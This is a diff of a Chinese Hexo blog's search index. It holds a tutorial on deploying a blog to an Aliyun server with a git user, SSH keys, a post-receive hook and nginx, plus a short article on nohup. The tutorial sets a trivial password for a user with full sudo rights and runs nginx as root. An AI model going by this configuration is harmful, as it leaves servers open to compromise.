+<h4 id="增加git用户执行sudo的权限"><a href="#增加git用户执行sudo的权限" class="headerlink" title="增加git用户执行sudo的权限"></a>增加git用户执行sudo的权限</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 740 /etc/sudoers</span><br><span class="line">vim /etc/sudoers</span><br></pre></td></tr></table></figure>
+<p>找到以下内容：root ALL&#x3D;(ALL) ALL在下面添加一行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git     ALL=(ALL)       ALL</span><br></pre></td></tr></table></figure>
+<p>保存退出后改回权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 400 /etc/sudoers</span><br></pre></td></tr></table></figure>
+
+<h3 id="服务器打开RSA认证"><a href="#服务器打开RSA认证" class="headerlink" title="服务器打开RSA认证"></a>服务器打开RSA认证</h3><p>RSA用公钥加密，私钥解密，成为加密通信。<br>用私钥加密，公钥解密，就是认证。（这样就能证明消息是你发出的。）<br>因为：公钥大家都有，私钥就只有一个，在你自己手里。<br><img src="https://s3.ax1x.com/2020/12/06/DXzRTP.png"></p>
+<h4 id="开启认证配置"><a href="#开启认证配置" class="headerlink" title="开启认证配置"></a>开启认证配置</h4><h5 id="服务器端："><a href="#服务器端：" class="headerlink" title="服务器端："></a>服务器端：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>
+<p>在sshd_config中开启以下几项：(前两项yes，后一项修改为如下)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile  .ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+<p>重启sshd</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop sshd.service</span><br><span class="line">systemctl start sshd.service</span><br></pre></td></tr></table></figure>
+<h4 id="建立ssh信任关系"><a href="#建立ssh信任关系" class="headerlink" title="建立ssh信任关系"></a>建立ssh信任关系</h4><p>本地电脑生成秘钥对-&gt;发送公钥到服务器-&gt;本地可免密连接服务器</p>
+<h5 id="在本地电脑-生成密钥对"><a href="#在本地电脑-生成密钥对" class="headerlink" title="在本地电脑:生成密钥对"></a>在本地电脑:生成密钥对</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;邮箱&quot; </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s3.ax1x.com/2020/12/06/DjSY9S.png"><br>成功后，会在c盘用户下新建秘钥对：</p>
+<p><img src="https://s3.ax1x.com/2020/12/06/DjSrNV.png"></p>
+<h5 id="在服务器-切换至git用户，创建-x2F-ssh-文件夹"><a href="#在服务器-切换至git用户，创建-x2F-ssh-文件夹" class="headerlink" title="在服务器:切换至git用户，创建 ~&#x2F;.ssh 文件夹"></a>在服务器:切换至git用户，创建 ~&#x2F;.ssh 文件夹</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git</span><br><span class="line">mkdir ~/.ssh</span><br></pre></td></tr></table></figure>
+<p>或者root用户直接创建：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/git/</span><br><span class="line">mkdir .ssh</span><br></pre></td></tr></table></figure>
+
+<h5 id="在本地电脑-发送公钥-id-rsa-pub-到-x2F-home-x2F-git-x2F-ssh-x2F-authorzied-keys"><a href="#在本地电脑-发送公钥-id-rsa-pub-到-x2F-home-x2F-git-x2F-ssh-x2F-authorzied-keys" class="headerlink" title="在本地电脑:发送公钥 id_rsa.pub 到 &#x2F;home&#x2F;git&#x2F;.ssh&#x2F;authorzied_keys"></a>在本地电脑:发送公钥 id_rsa.pub 到 &#x2F;home&#x2F;git&#x2F;.ssh&#x2F;authorzied_keys</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-copy-id -i C:/Users/CUNGU/.ssh/id_rsa.pub git@47.93.50.90 //把公钥发送给服务器</span><br><span class="line">ssh git@47.93.50.90 // 测试能否登录</span><br></pre></td></tr></table></figure>
+<p>服务器文件夹也有了公钥：</p>
+<p><img src="https://s3.ax1x.com/2020/12/06/DjpPgg.png"></p>
+<h5 id="文件夹权限调整：authorzied-keys权限为600时才生效"><a href="#文件夹权限调整：authorzied-keys权限为600时才生效" class="headerlink" title="文件夹权限调整：authorzied_keys权限为600时才生效"></a>文件夹权限调整：authorzied_keys权限为600时才生效</h5><p>git用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git</span><br><span class="line">chmod 700 ~/.ssh</span><br><span class="line">chmod 600 ~/.ssh/authorzied_keys</span><br></pre></td></tr></table></figure>
+<p>第二步没有成功，说我没有权限（Permission denied）；emmm，root设置好了</p>
+<p><img src="https://s3.ax1x.com/2020/12/06/DjpK8U.png"><br>root设置第二步：(注意在.ssh目录下)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit // 退出到 root 登录</span><br><span class="line">sudo chmod 600 authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s3.ax1x.com/2020/12/06/Djp2Pf.png"><br>现在就搭建好git桥梁，为后面实现hexo d部署时，可以自动上传啦！</p>
+<h3 id="创建blog-git空仓库"><a href="#创建blog-git空仓库" class="headerlink" title="创建blog.git空仓库"></a>创建blog.git空仓库</h3><h4 id="切换到git用户，接下来都是在git用户权限下进行操作："><a href="#切换到git用户，接下来都是在git用户权限下进行操作：" class="headerlink" title="切换到git用户，接下来都是在git用户权限下进行操作："></a>切换到git用户，接下来都是在git用户权限下进行操作：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git                //切换git用户</span><br><span class="line">cd /home/git/</span><br><span class="line">mkdir -p projects/blog  //创建你的博客目录</span><br><span class="line">mkdir repos &amp;&amp; cd repos</span><br><span class="line">git init --bare blog.git  //创建一个空仓库</span><br><span class="line">cd blog.git/hooks</span><br><span class="line">vi post-receive  //创建hook钩子函数，输入以下内容</span><br><span class="line">git --work-tree=/home/git/projects/blog --git-dir=/home/git/repos/blog.git checkout -f</span><br><span class="line">chmod +x post-receive  // 修改钩子函数权限</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s3.ax1x.com/2020/12/06/Dj98SS.png"></p>
+<h4 id="改变-hexo-git-目录的拥有者为git用户："><a href="#改变-hexo-git-目录的拥有者为git用户：" class="headerlink" title="改变 hexo.git 目录的拥有者为git用户："></a>改变 hexo.git 目录的拥有者为git用户：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chown -R git:git blog.git</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s3.ax1x.com/2020/12/06/Dj9BWT.png"></p>
+<h5 id="添加备份目录"><a href="#添加备份目录" class="headerlink" title="添加备份目录"></a>添加备份目录</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/git/projects/</span><br><span class="line">mkdir -p tmp/blog</span><br></pre></td></tr></table></figure>
+<p>修改钩子的内容：（重点是git clone 克隆到主目录home&#x2F;git&#x2F;projects&#x2F;blog主目录要配置到nginx中去的）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">GIT_REPO=/home/git/repos/blog.git    # git仓库</span><br><span class="line">TMP_GIT_CLONE=/home/git/projects/tmp/blog</span><br><span class="line">PUBLIC_WWW=/home/git/projects/blog  # 网站目录</span><br><span class="line">rm -rf $&#123;TMP_GIT_CLONE&#125;</span><br><span class="line">git clone $GIT_REPO $TMP_GIT_CLONE</span><br><span class="line">rm -rf $&#123;PUBLIC_WWW&#125;/*</span><br><span class="line">cp -rf $&#123;TMP_GIT_CLONE&#125;/* $&#123;PUBLIC_WWW&#125;</span><br><span class="line">chmod +x post-receive          # 赋予脚本的执行权限</span><br></pre></td></tr></table></figure>
+<p>git用户赋权：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git</span><br><span class="line">chmod +x post-receive</span><br><span class="line">exit // 退出到 root 登录</span><br><span class="line">chown -R git:git /home/git/repos/blog.git // 添加权限</span><br><span class="line">sudo chown git:git -R /home/git/projects/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s3.ax1x.com/2020/12/06/DjCPmj.png"></p>
+<p>蓝色为更新后的上传机制：</p>
+<p><img src="https://s3.ax1x.com/2020/12/06/DjCncF.png"></p>
+<p>为了安全起见，我们需要关闭git账号登录shell的权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/passwd</span><br></pre></td></tr></table></figure>
+<p>找到git账号(一般在最后面)添加：&#x2F;usr&#x2F;bin&#x2F;git-shell</p>
+<p><img src="https://s3.ax1x.com/2020/12/06/DjCl7R.png"></p>
+<p>加上git就只能git clone，如需shell操作，撤销&#x2F;usr&#x2F;bin&#x2F;git-shell即可。</p>
+<p>####在本地任意一空目录，测试git仓库是否可用（测试步骤，稍后可清除）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone git@48.53.57.50:/home/git/repos/blog.git</span><br></pre></td></tr></table></figure>
+
+<p>实际拉下来的是你的&#x2F;home&#x2F;git&#x2F;projects&#x2F;blog，哈哈哈还是空的~</p>
+<p><img src="https://s3.ax1x.com/2020/12/06/DjC3A1.png"></p>
+<h3 id="hexo配置"><a href="#hexo配置" class="headerlink" title="hexo配置"></a>hexo配置</h3><p>修改博客根目录配置_config.yml，部署部分，增添repo</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  message: update</span><br><span class="line">  gitee: https://gitee.com/cungudafa/cungudafa.git</span><br><span class="line">  repo: git@48.53.57.50:/home/git/repos/blog.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>只有在ssh秘钥配置成功，才能成功上传。如果需要修改公钥，要打开git操作shell的权限哦！vim &#x2F;etc&#x2F;passwd最后一句。及时开，及时关，做到万无一失。</p>
+</blockquote>
+<h3 id="nginx配置"><a href="#nginx配置" class="headerlink" title="nginx配置"></a>nginx配置</h3><ul>
+<li>到这里，我发现一个问题，用源码安装和sudo apt install nginx安装，文件结构是不同的</li>
+<li>这里我选择的是sudo apt install nginx的方式安装<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure>
+<p>修改用户为root用户</p>
+<p><img src="https://s3.ax1x.com/2020/12/06/Dji6Og.png"></p>
+<p>1.端口号（阿里云控制台安全组规则要打开端口哦）<br>2.修改域名<br>3.修改根目录位置</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure>
+<p><img src="https://s3.ax1x.com/2020/12/06/DjFPne.png"></p>
+<blockquote>
+<p>到这里只要重启nginx就可以了，但是我没发现sbin文件，就从进程重启了</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef | grep nginx</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill -HUP 进程号</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s3.ax1x.com/2020/12/06/DjF69x.png"></p>
+<p>接下来就可以用域名或者公网IP访问了</p>
+]]></content>
+      <categories>
+        <category>Hexo</category>
+      </categories>
+      <tags>
+        <tag>博客搭建</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ctfshow命令执行</title>
     <url>/WP/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>VIP题目，情况极多，记录！</p>
@@ -1815,124 +1936,29 @@ String.format(&quot;abc&quot; )
       </tags>
   </entry>
   <entry>
-    <title>hexo部署到阿里云服务器</title>
-    <url>/bolg/hexo%E9%83%A8%E7%BD%B2%E5%88%B0%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
-<p>域名还没下来，就先用gitee，但是先记录一下自己hexo部署过程o(<em>￣▽￣</em>)o</p>
-</blockquote>
+    <title>nohup命令</title>
+    <url>/Linux/nohup%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>如果你正在运行一个进程，而且你觉得在退出帐户时该进程还不会结束，那么可以使用 nohup 命令。</p>
 <span id="more"></span>
 
-<blockquote>
-<p>这里说一下vim的基本操作方便不会的同学进行搭建<br>i–&gt;编辑<br>按一下ESC输入:wq–&gt;保存并退出（冒号也要输入啊！）<br>按一下ESC输入:!wq–&gt;保存并强制退出</p>
-</blockquote>
-<h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><ul>
-<li>本地hexo构建可运行发布</li>
-<li>阿里云服务器能访问</li>
-<li>有一个域名(非必须项，可以公网ip查看嘛~)</li>
-<li>Xshell和Xftp且已连接至服务器（怎么连接自行百度，这里就不做过多讲解）</li>
-</ul>
-<h3 id="服务器环境"><a href="#服务器环境" class="headerlink" title="服务器环境"></a>服务器环境</h3><ul>
-<li>Ubantu 20.04</li>
-</ul>
-<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul>
-<li>回顾一下Hexo发布到gitee（Pages）的流程：</li>
-<li>本地计算机用Hexo构建静态文件public</li>
-<li>关键一步就是git上传github或gitee</li>
-<li>发布Pages将仓库目录<a href="https://gitee.com/cungudafa/cungudafa/index.html%E6%8B%89%E5%8F%96%E5%88%B0https://cungudafa.gitee.io/index.html">https://gitee.com/cungudafa/cungudafa/index.html拉取到https://cungudafa.gitee.io/index.html</a></li>
-</ul>
-<p><img src="https://s3.ax1x.com/2020/12/06/DXOrtg.png"><br>当然我们需要上传的是public文件夹；每次xftp手动上传肯定是不现实且麻烦的，所以我们接下来要在服务器安装git。</p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="服务器创建服务器创建git用户"><a href="#服务器创建服务器创建git用户" class="headerlink" title="服务器创建服务器创建git用户"></a>服务器创建服务器创建git用户</h3><h4 id="创建一个git用户，用来运行git服务。（root不安全）"><a href="#创建一个git用户，用来运行git服务。（root不安全）" class="headerlink" title="创建一个git用户，用来运行git服务。（root不安全）"></a>创建一个git用户，用来运行git服务。（root不安全）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo useradd git -m</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>注意：Ubantu下必须加上-m，才会自动新建用户目录&#x2F;home&#x2F;git&#x2F;（后面配置和博客文件都放在这里）<br>在&#x2F;home&#x2F;git&#x2F;非常重要，如果出错，可以删除sudo userdel -r git用户，重新之前的步骤。</p>
-</blockquote>
-<h4 id="设置密码"><a href="#设置密码" class="headerlink" title="设置密码"></a>设置密码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo passwd git</span><br></pre></td></tr></table></figure>
-<p>密码就是git吧，简单为上。</p>
-<h4 id="增加git用户执行sudo的权限"><a href="#增加git用户执行sudo的权限" class="headerlink" title="增加git用户执行sudo的权限"></a>增加git用户执行sudo的权限</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 740 /etc/sudoers</span><br><span class="line">vim /etc/sudoers</span><br></pre></td></tr></table></figure>
-<p>找到以下内容：root ALL&#x3D;(ALL) ALL在下面添加一行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git     ALL=(ALL)       ALL</span><br></pre></td></tr></table></figure>
-<p>保存退出后改回权限：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 400 /etc/sudoers</span><br></pre></td></tr></table></figure>
+<h1 id="命令简介"><a href="#命令简介" class="headerlink" title="命令简介"></a>命令简介</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nohup Command [ Arg … ] [ &amp; ]</span><br></pre></td></tr></table></figure>
 
-<h3 id="服务器打开RSA认证"><a href="#服务器打开RSA认证" class="headerlink" title="服务器打开RSA认证"></a>服务器打开RSA认证</h3><p>RSA用公钥加密，私钥解密，成为加密通信。<br>用私钥加密，公钥解密，就是认证。（这样就能证明消息是你发出的。）<br>因为：公钥大家都有，私钥就只有一个，在你自己手里。<br><img src="https://s3.ax1x.com/2020/12/06/DXzRTP.png"></p>
-<h4 id="开启认证配置"><a href="#开启认证配置" class="headerlink" title="开启认证配置"></a>开启认证配置</h4><h5 id="服务器端："><a href="#服务器端：" class="headerlink" title="服务器端："></a>服务器端：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>
-<p>在sshd_config中开启以下几项：(前两项yes，后一项修改为如下)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile  .ssh/authorized_keys</span><br></pre></td></tr></table></figure>
-<p>重启sshd</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop sshd.service</span><br><span class="line">systemctl start sshd.service</span><br></pre></td></tr></table></figure>
-<h4 id="建立ssh信任关系"><a href="#建立ssh信任关系" class="headerlink" title="建立ssh信任关系"></a>建立ssh信任关系</h4><p>本地电脑生成秘钥对-&gt;发送公钥到服务器-&gt;本地可免密连接服务器</p>
-<h5 id="在本地电脑-生成密钥对"><a href="#在本地电脑-生成密钥对" class="headerlink" title="在本地电脑:生成密钥对"></a>在本地电脑:生成密钥对</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;邮箱&quot; </span><br></pre></td></tr></table></figure>
+<p>该命令可以在你退出帐户&#x2F;关闭终端之后继续运行相应的进程。<code>nohup</code>就是不挂起的意思（<code>no hang up</code>）。</p>
+<p><code>nohup</code> 运行由 <code>Command</code> 和相关的 <code>Arg</code> 参数指定的命令，忽略所有挂断（<code>SIGHUP</code>）信号。要运行后台中的 <code>nohup</code> 命令，添加 <code>&amp;</code> （ 表示 <code>and</code> 的符号）到命令的尾部。</p>
+<p>如果使用 <code>nohup</code> 命令提交作业，那么在缺省情况下该作业的所有输出都被重定向到一个名为 nohup.out 的文件中，除非另外指定了输出文件。</p>
+<h1 id="使用举例"><a href="#使用举例" class="headerlink" title="使用举例"></a>使用举例</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nohup java -jar adapter-minisite.jar /tomcat-1 /tomcat-2 &gt; logs.txt 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://s3.ax1x.com/2020/12/06/DjSY9S.png"><br>成功后，会在c盘用户下新建秘钥对：</p>
-<p><img src="https://s3.ax1x.com/2020/12/06/DjSrNV.png"></p>
-<h5 id="在服务器-切换至git用户，创建-x2F-ssh-文件夹"><a href="#在服务器-切换至git用户，创建-x2F-ssh-文件夹" class="headerlink" title="在服务器:切换至git用户，创建 ~&#x2F;.ssh 文件夹"></a>在服务器:切换至git用户，创建 ~&#x2F;.ssh 文件夹</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git</span><br><span class="line">mkdir ~/.ssh</span><br></pre></td></tr></table></figure>
-<p>或者root用户直接创建：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/git/</span><br><span class="line">mkdir .ssh</span><br></pre></td></tr></table></figure>
+<p>在上面的例子中，运行命令 <code>java -jar adapter-minisite.jar</code> 输入参数 <code>/tomcat-1</code> 和 <code>/tomcat-2</code>，输出被重定向到 <code>logs.txt</code> 文件中。</p>
+<h1 id="退出任务"><a href="#退出任务" class="headerlink" title="退出任务"></a>退出任务</h1><p>如果运行的任务在当前 <code>shell</code> 终端，可以通过 <code>jobs</code> 命令查询相关信息，并且杀掉进程。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看当前 shell 终端的后台运行任务进程信息</span><br><span class="line">$ jobs</span><br><span class="line">[1]+ Running nohup java -jar adapter-minisite.jar /tomcat-1 /tomcat-2 &gt; logs.txt 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line"># 杀掉任务号</span><br><span class="line">$ kill %1</span><br><span class="line"></span><br><span class="line"># 或着找到 pid</span><br><span class="line">$ jobs -l</span><br><span class="line">[1]+ 11076 Running nohup java -jar adapter-minisite.jar /tomcat-1 /tomcat-2 &gt; logs.txt 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line">$ kill 11076</span><br><span class="line"></span><br><span class="line"># 或着</span><br><span class="line">$ fg %n # 置为前端运行</span><br><span class="line"></span><br><span class="line">Ctrl + c # 退出</span><br></pre></td></tr></table></figure>
 
-<h5 id="在本地电脑-发送公钥-id-rsa-pub-到-x2F-home-x2F-git-x2F-ssh-x2F-authorzied-keys"><a href="#在本地电脑-发送公钥-id-rsa-pub-到-x2F-home-x2F-git-x2F-ssh-x2F-authorzied-keys" class="headerlink" title="在本地电脑:发送公钥 id_rsa.pub 到 &#x2F;home&#x2F;git&#x2F;.ssh&#x2F;authorzied_keys"></a>在本地电脑:发送公钥 id_rsa.pub 到 &#x2F;home&#x2F;git&#x2F;.ssh&#x2F;authorzied_keys</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-copy-id -i C:/Users/CUNGU/.ssh/id_rsa.pub git@47.93.50.90 //把公钥发送给服务器</span><br><span class="line">ssh git@47.93.50.90 // 测试能否登录</span><br></pre></td></tr></table></figure>
-<p>服务器文件夹也有了公钥：</p>
-<p><img src="https://s3.ax1x.com/2020/12/06/DjpPgg.png"></p>
-<h5 id="文件夹权限调整：authorzied-keys权限为600时才生效"><a href="#文件夹权限调整：authorzied-keys权限为600时才生效" class="headerlink" title="文件夹权限调整：authorzied_keys权限为600时才生效"></a>文件夹权限调整：authorzied_keys权限为600时才生效</h5><p>git用户：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git</span><br><span class="line">chmod 700 ~/.ssh</span><br><span class="line">chmod 600 ~/.ssh/authorzied_keys</span><br></pre></td></tr></table></figure>
-<p>第二步没有成功，说我没有权限（Permission denied）；emmm，root设置好了</p>
-<p><img src="https://s3.ax1x.com/2020/12/06/DjpK8U.png"><br>root设置第二步：(注意在.ssh目录下)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit // 退出到 root 登录</span><br><span class="line">sudo chmod 600 authorized_keys</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s3.ax1x.com/2020/12/06/Djp2Pf.png"><br>现在就搭建好git桥梁，为后面实现hexo d部署时，可以自动上传啦！</p>
-<h3 id="创建blog-git空仓库"><a href="#创建blog-git空仓库" class="headerlink" title="创建blog.git空仓库"></a>创建blog.git空仓库</h3><h4 id="切换到git用户，接下来都是在git用户权限下进行操作："><a href="#切换到git用户，接下来都是在git用户权限下进行操作：" class="headerlink" title="切换到git用户，接下来都是在git用户权限下进行操作："></a>切换到git用户，接下来都是在git用户权限下进行操作：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git                //切换git用户</span><br><span class="line">cd /home/git/</span><br><span class="line">mkdir -p projects/blog  //创建你的博客目录</span><br><span class="line">mkdir repos &amp;&amp; cd repos</span><br><span class="line">git init --bare blog.git  //创建一个空仓库</span><br><span class="line">cd blog.git/hooks</span><br><span class="line">vi post-receive  //创建hook钩子函数，输入以下内容</span><br><span class="line">git --work-tree=/home/git/projects/blog --git-dir=/home/git/repos/blog.git checkout -f</span><br><span class="line">chmod +x post-receive  // 修改钩子函数权限</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s3.ax1x.com/2020/12/06/Dj98SS.png"></p>
-<h4 id="改变-hexo-git-目录的拥有者为git用户："><a href="#改变-hexo-git-目录的拥有者为git用户：" class="headerlink" title="改变 hexo.git 目录的拥有者为git用户："></a>改变 hexo.git 目录的拥有者为git用户：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chown -R git:git blog.git</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s3.ax1x.com/2020/12/06/Dj9BWT.png"></p>
-<h5 id="添加备份目录"><a href="#添加备份目录" class="headerlink" title="添加备份目录"></a>添加备份目录</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/git/projects/</span><br><span class="line">mkdir -p tmp/blog</span><br></pre></td></tr></table></figure>
-<p>修改钩子的内容：（重点是git clone 克隆到主目录home&#x2F;git&#x2F;projects&#x2F;blog主目录要配置到nginx中去的）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">GIT_REPO=/home/git/repos/blog.git    # git仓库</span><br><span class="line">TMP_GIT_CLONE=/home/git/projects/tmp/blog</span><br><span class="line">PUBLIC_WWW=/home/git/projects/blog  # 网站目录</span><br><span class="line">rm -rf $&#123;TMP_GIT_CLONE&#125;</span><br><span class="line">git clone $GIT_REPO $TMP_GIT_CLONE</span><br><span class="line">rm -rf $&#123;PUBLIC_WWW&#125;/*</span><br><span class="line">cp -rf $&#123;TMP_GIT_CLONE&#125;/* $&#123;PUBLIC_WWW&#125;</span><br><span class="line">chmod +x post-receive          # 赋予脚本的执行权限</span><br></pre></td></tr></table></figure>
-<p>git用户赋权：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git</span><br><span class="line">chmod +x post-receive</span><br><span class="line">exit // 退出到 root 登录</span><br><span class="line">chown -R git:git /home/git/repos/blog.git // 添加权限</span><br><span class="line">sudo chown git:git -R /home/git/projects/</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s3.ax1x.com/2020/12/06/DjCPmj.png"></p>
-<p>蓝色为更新后的上传机制：</p>
-<p><img src="https://s3.ax1x.com/2020/12/06/DjCncF.png"></p>
-<p>为了安全起见，我们需要关闭git账号登录shell的权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/passwd</span><br></pre></td></tr></table></figure>
-<p>找到git账号(一般在最后面)添加：&#x2F;usr&#x2F;bin&#x2F;git-shell</p>
-<p><img src="https://s3.ax1x.com/2020/12/06/DjCl7R.png"></p>
-<p>加上git就只能git clone，如需shell操作，撤销&#x2F;usr&#x2F;bin&#x2F;git-shell即可。</p>
-<p>####在本地任意一空目录，测试git仓库是否可用（测试步骤，稍后可清除）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone git@48.53.57.50:/home/git/repos/blog.git</span><br></pre></td></tr></table></figure>
-
-<p>实际拉下来的是你的&#x2F;home&#x2F;git&#x2F;projects&#x2F;blog，哈哈哈还是空的~</p>
-<p><img src="https://s3.ax1x.com/2020/12/06/DjC3A1.png"></p>
-<h3 id="hexo配置"><a href="#hexo配置" class="headerlink" title="hexo配置"></a>hexo配置</h3><p>修改博客根目录配置_config.yml，部署部分，增添repo</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  message: update</span><br><span class="line">  gitee: https://gitee.com/cungudafa/cungudafa.git</span><br><span class="line">  repo: git@48.53.57.50:/home/git/repos/blog.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>只有在ssh秘钥配置成功，才能成功上传。如果需要修改公钥，要打开git操作shell的权限哦！vim &#x2F;etc&#x2F;passwd最后一句。及时开，及时关，做到万无一失。</p>
-</blockquote>
-<h3 id="nginx配置"><a href="#nginx配置" class="headerlink" title="nginx配置"></a>nginx配置</h3><ul>
-<li>到这里，我发现一个问题，用源码安装和sudo apt install nginx安装，文件结构是不同的</li>
-<li>这里我选择的是sudo apt install nginx的方式安装<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h4 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure>
-<p>修改用户为root用户</p>
-<p><img src="https://s3.ax1x.com/2020/12/06/Dji6Og.png"></p>
-<p>1.端口号（阿里云控制台安全组规则要打开端口哦）<br>2.修改域名<br>3.修改根目录位置</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure>
-<p><img src="https://s3.ax1x.com/2020/12/06/DjFPne.png"></p>
-<blockquote>
-<p>到这里只要重启nginx就可以了，但是我没发现sbin文件，就从进程重启了</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef | grep nginx</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill -HUP 进程号</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s3.ax1x.com/2020/12/06/DjF69x.png"></p>
-<p>接下来就可以用域名或者公网IP访问了</p>
